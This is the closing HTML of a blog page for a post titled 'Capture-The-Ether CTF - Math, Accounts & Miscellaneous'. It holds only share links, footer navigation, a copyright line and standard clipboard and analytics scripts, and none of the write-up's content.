  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&title=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&name=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/&t=Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2022
    Chandu Kona
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4V3049N925"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-4V3049N925');
    </script>

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
